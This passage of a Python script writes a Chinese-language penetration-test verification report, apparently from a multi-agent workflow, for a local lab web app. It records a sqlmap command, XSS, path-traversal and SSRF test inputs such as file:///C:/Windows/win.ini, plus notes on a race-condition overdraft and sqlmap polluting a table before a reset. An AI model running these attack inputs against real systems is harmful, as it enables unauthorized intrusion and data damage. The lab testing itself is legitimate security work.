     "cmd": "python dsh-tools\\tools\\sqlmap\\sqlmap.py -u \"http://127.0.0.1:8095/api/search?q=k\" -p q --cookie=\"token=<demo>\" --batch --level=2 --risk=1",
     "result": "三处均『does not seem to be injectable / all tested parameters do not appear to be injectable』",
     "evidence": "sqlmap-t5-verify.log、sqlmap-t5-verify-board2.log"},
    {"id": "N-02", "area": "IDOR/越权", "verdict": "确认为阴性",
     "result": "alice 读 bob 的 /api/profile → 404；alice 读 demo 的 /api/order → 404；/order/status 跨用户 → 404；/admin/users、/admin/orders 非 admin → 404；未登录 → 302",
     "evidence": "verify-02-logic-session-20261012-1855.json idor_negatives"},
    {"id": "N-03", "area": "XSS", "verdict": "确认为阴性",
     "result": "/forgot 中 <script>alert(1)</script> 以 &lt;script&gt; 回显；/board 中 <img …> 以转义形式出现",
     "evidence": "verify-03-…json hunt05.xss_escaped、hunt07.escaped（均为 True）"},
    {"id": "N-04", "area": "路径穿越/任意文件读", "verdict": "确认为阴性",
     "result": "/download?file=..%2fapp.py → 403；../private/config.bak → 403；空 file → 404；readme.txt → 200",
     "evidence": "verify-03-…json download_negatives"},
    {"id": "N-05", "area": "上传后缀绕过/落盘越界", "verdict": "确认为阴性（除匿名上传本身）",
     "result": "fake.jpg（非 JPEG 魔数）→ 400『文件内容与扩展名不匹配』；落盘名经 basename 规整，未见 ../ 越界",
     "evidence": "verify-04-…json upload_detail.jpg_wrong_magic"},
    {"id": "N-06", "area": "SSRF 越界", "verdict": "确认为阴性",
     "result": "http://localhost:8095 → 403；http://127.0.0.1:9999 → 403；file:///C:/Windows/win.ini → 403；http://127.0.0.1:8091 → 200（设计内白名单端口，内容为 8091 公开首页）",
     "evidence": "verify-03-…json ssrf、verify-05-…json fetch_8091"},
    {"id": "N-07", "area": "认证与令牌可预测性", "verdict": "确认为阴性",
     "result": "会话 token 为 secrets.token_urlsafe(32)，本机 5 个样本长度 43、字符集 [A-Za-z0-9_-]，无规律可推",
     "evidence": "verify-02-…json token_entropy"},
    {"id": "N-08", "area": "未授权状态变更", "verdict": "确认为阴性",
     "result": "匿名 GET /order/create、GET /wallet/withdraw 均 302 → /?err=login（未产生数据变更）",
     "evidence": "verify-02-…json anon_write_blocked"},
]

report = {
    "meta": {
        "task": "t5 阶段4 验证",
        "verifier": "verifier",
        "attempt_id": "450d203c-0db1-4e81-a1fd-bcd94117576a",
        "generated": "2026-10-12T18:48:00+08:00",
        "scope": ["http://127.0.0.1:8095", "http://127.0.0.1:8091（只读连通核对）"],
        "method": "自写 http.client 取证脚本（不引用挖掘员的 hunt-lib.py）+ 直查 lab.db + sqlmap 独立复打 + 源码逐行比对",
        "baseline_sha256": BASE_SHA,
        "final_sha256": BASE_SHA,
        "final_integrity_check": "ok",
    },
    "summary": {
        "input_findings": 15,
        "output_findings": 16,
        "confirmed": 14,
        "confirmed_no_impact": 2,
        "false_positive_or_unsupported": 5,
        "needs_verifier_closed": 15,
        "new_findings": 1,
        "severity_after_verification": {"high": 2, "medium": 5, "low": 7, "info": 2},
        "top1": "VER-01 并发下单 TOCTOU：30 并发把余额 50000 分打成 -7000 分（超额 4 单 / 资产缺口 57000 分），3/3 轮复现",
    },
    "confirmed_findings": findings,
    "false_positives": false_positives,
    "negatives_verified": negatives,
    "evidence_index": [
        {"tag": k, "file": v, "sha256": RAW_SHA.get(k)} for k, v in RAW.items()
    ],
    "lab_side_effects": [
        "本轮共执行 /__reset 7 次：18:41(step0)、18:43×2、18:44、18:45、18:45(step6)、18:45(收尾)",
        "并发竞态造成 demo 余额 -7000/-3200/-7000（3 轮），每次以 /__reset 复原",
        "step2 资金操作：alice 88800→55300 后复位；admin→demo 转账 500 分后复位",
        "step6 改密：alice 口令临时改为 verifierT5pw! 并已改回 alice123，随后 /__reset",
        "sqlmap 打 /board 的布尔盲注测试向 messages 表写入 1454 行匿名 payload（18:45:4x），已 kill 作业并 /__reset 清除",
        "所有轮次结束时 lab.db sha256 = 49b2…6cc7af（= t1 基线），PRAGMA integrity_check=ok，uploads/ 为空",
    ],
    "open_questions": [
        "VER-05 的改密链仍缺消费端（/reset 404），需确认是否存在隐藏路由或前端未暴露",
        "VER-01 仅测 30 并发；不同并发度/CPU 调度下的成功率区间未穷举（建议 hunter/scribe 记录为『≥95%』而非 100%）",
        "本次触发过一次基线污染（sqlmap 对写端点 /board 的注入测试）；后续任何工具打类前必须先确认参数对目标是否有写副作用",
    ],
    "cross_check_request": {
        "to": ["scribe", "mentor"],
        "asked": "请按笔记视角复核 VER-01/VER-03 的证据链是否闭合：原始包、库内前后值、回滚记录三者是否互相印证",
        "status": "本次未等到回执（发消息即算请求）；报告不依赖回执成立",
    },
}

json_path = os.path.join(EVID, f"verified-{TS}.json")
with open(json_path, "w", encoding="utf-8") as fh:
    json.dump(report, fh, ensure_ascii=False, indent=1)
print("wrote", json_path, os.path.getsize(json_path))

# ---------------- markdown ----------------
md = []
md.append(f"# 阶段4 验证报告（t5 / verifier / attempt 450d203c）")
md.append("")
md.append(f"生成时间：2026-10-12T18:48+08:00　目标：{H}（127.0.0.1:8091 仅做只读连通核对）")
md.append("")
md.append("## 结论")
md.append(f"- 输入疑似清单 15 条：**confirmed {report['summary']['confirmed']} 条**（其中 1 条为本轮新增发现）、**行为确认但无实际影响 {report['summary']['confirmed_no_impact']} 条**、**误报/依据不足 {report['summary']['false_positive_or_unsupported']} 条**。")
from collections import Counter as _C
_sev = _C(f["severity"] for f in findings)
md.append("- 严重度重估（按实测危害）：high %d / medium %d / low %d / info %d。原报告 high=4 中，HUNT-03/HUNT-04 的独立可利用性被下调（前置条件分别需 admin 会话、需已持有 Cookie）。" % (_sev["high"], _sev["medium"], _sev["low"], _sev["info"]))
md.append("- Top1：VER-01 并发下单 TOCTOU，3/3 轮把 demo 余额 50000 分打成 -7000 分（超额下单 4 单，资产缺口 57000 分）；对照组 /wallet/withdraw 并发 20 次无负数。")
md.append("- 全部验证动作收尾后 lab.db sha256 = " + BASE_SHA + "（= t1 基线），integrity_check=ok，uploads/ 为空。")
md.append("")
md.append("## 逐条判定")
md.append("")
md.append("| id | 来源 | 判定 | 严重度 | 复现率 | 要点 |")
md.append("|---|---|---|---|---|---|")
for f in findings:
    md.append(f"| {f['id']} | {f['src_id']} | {f['verdict']} | {f['severity']} | {f['repro_rate'].split('；')[0]} | {f['title']} |")
md.append("")
md.append("## 误报与不成立")
md.append("")
for fp in false_positives:
    md.append(f"- **{fp['id']}** {fp['ref']}：{fp['reason']}")
md.append("")
md.append("## 阴性复核（独立重打）")
md.append("")
for n in negatives:
    md.append(f"- **{n['id']} {n['area']}**：{n['result']}")
md.append("")
md.append("## 原始证据索引")
md.append("")
for e in report["evidence_index"]:
    md.append(f"- `{e['file']}`" + (f"　sha256={e['sha256']}" if e['sha256'] else ""))
md.append("")
md.append("## 未决问题")
md.append("")
for q in report["open_questions"]:
    md.append(f"- {q}")

md_path = os.path.join(EVID, f"verified-{TS}.md")
with open(md_path, "w", encoding="utf-8") as fh:
    fh.write("\n".join(md) + "\n")
print("wrote", md_path, os.path.getsize(md_path))
